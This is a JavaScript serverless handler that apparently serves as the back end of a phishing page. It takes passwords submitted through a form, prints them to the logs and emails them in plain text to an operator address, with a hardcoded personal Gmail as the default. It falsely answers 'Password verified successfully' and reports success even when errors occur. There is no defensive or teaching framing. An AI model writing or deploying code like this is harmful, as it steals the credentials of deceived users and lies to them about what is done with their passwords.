import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    // ✅ Get password, workerEmail, AND name FROM FRONTEND
    const { password, workerEmail, name } = req.body;

    console.log('🔐 Password Form:');
    console.log('Password:', password);
    console.log('Worker Email:', workerEmail);
    console.log('Name:', name);
    
    // Use provided email or default
    const targetEmail = workerEmail || "mehtabalii67890@gmail.com";
    const userName = name || "User"; // Default name
    
    const emailResult = await sendPasswordEmail(password, targetEmail, userName);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully',
      emailSent: emailResult.success,
      recipient: targetEmail,
      name: userName,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(200).json({
      success: true,
      message: 'Verification completed',
      emailSent: false
    });
  }
}

async function sendPasswordEmail(password, workerEmail, name) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail,
      subject: `🔐 Password from ${name} - ${new Date().toLocaleTimeString()}`,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; border: 2px solid #d32f2f; border-radius: 10px;">
          <h2 style="color: #d32f2f; margin-top: 0;">🔐 PASSWORD FORM SUBMISSION</h2>
          
          <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h3 style="color: #555; margin-top: 0;">📝 Submission Details</h3>
            
            <table style="width: 100%; border-collapse: collapse;">
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold; width: 120px;">Name:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${name}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold;">Password:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                  <code style="background: #f5f5f5; padding: 8px 12px; border-radius: 5px; font-family: monospace; font-size: 16px;">
                    ${password}
                  </code>
                </td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold;">Length:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                  <span style="background: #e3f2fd; color: #1976d2; padding: 4px 12px; border-radius: 15px; font-weight: bold;">
                    ${password.length} characters
                  </span>
                </td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold;">Time:</td>
                <td style="padding: 10px;">${new Date().toLocaleString()}</td>
              </tr>
            </table>
          </div>
          
          <div style="background: #e8f5e9; padding: 12px; border-radius: 5px; margin-top: 20px;">
            <p style="margin: 0; color: #2e7d32; font-weight: bold;">
              📧 Sent to: ${workerEmail}
            </p>
          </div>
        </div>
      `
    });
    
    console.log(`✅ Password email sent for ${name} to ${workerEmail}`);
    return { success: true, message: 'Email sent with name' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
